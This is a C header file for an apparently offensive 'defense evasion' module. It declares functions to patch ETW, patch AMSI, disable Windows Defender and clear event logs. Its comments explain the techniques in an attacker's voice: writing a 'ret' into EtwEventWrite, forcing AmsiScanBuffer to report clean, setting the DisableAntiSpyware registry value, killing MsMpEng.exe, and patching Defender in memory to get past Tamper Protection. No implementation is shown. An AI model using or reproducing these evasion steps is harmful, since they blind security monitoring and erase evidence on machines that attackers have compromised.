/*
 * Defense evasion module — ETW patching, AMSI patching, Defender disable.
 *
 * ETW patching:
 *   Microsoft uses ETW (Event Tracing for Windows) as the primary
 *   telemetry pipeline. Windows Defender, among others, subscribes to
 *   ETW events to detect suspicious activity. Patching EtwEventWrite
 *   in ntdll prevents event reporting. We use a memory page protection
 *   change to write a simple 'ret' instruction at the start of the
 *   function, making it a no-op.
 *
 *   Modern Windows also has EtwEventWriteFull and EtwLogTraceEvent.
 *   We patch all three for good measure.
 *
 * AMSI patching:
 *   AMSI (Anti-Malware Scan Interface) is how PowerShell, VBScript,
 *   and other scripting hosts submit scripts for inspection. By patching
 *   AmsiScanBuffer in amsi.dll to always return AMSI_RESULT_CLEAN, no
 *   script content is ever flagged. We use the well-known byte patch
 *   technique: change the first bytes of AmsiScanBuffer to return 0.
 *
 * Defender disable:
 *   Multiple approaches. The most reliable once we have admin/SYSTEM:
 *   - Disable via Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
 *     DisableAntiSpyware = 1 (DWORD)
 *   - Disable Realtime Monitoring via PowerShell or WMI
 *   - Kill the MsMpEng.exe process (usually needs SYSTEM + token tricks)
 *   - Remove Defender as a service (nuclear option)
 *
 * Gotchas:
 *   — ETW patching must be done per-process; child processes need patching too
 *   — AMSI patching is per-process as well
 *   — Defender has self-protection; registry changes may trigger tamper alerts
 *   — Windows 11 has "Tamper Protection" which blocks registry-based disable
 *   — We handle this by patching Defender's own DLLs in-memory
 */

#pragma once
#ifndef EVADE_H
#define EVADE_H

#include <windows.h>

/* Patch ETW in the current process */
void evade_patch_etw(void);

/* Patch AMSI in the current process */
void evade_patch_amsi(void);

/* Disable Windows Defender components */
void evade_disable_defender(void);

/* Clear Windows event logs */
void evade_clear_logs(void);

#endif
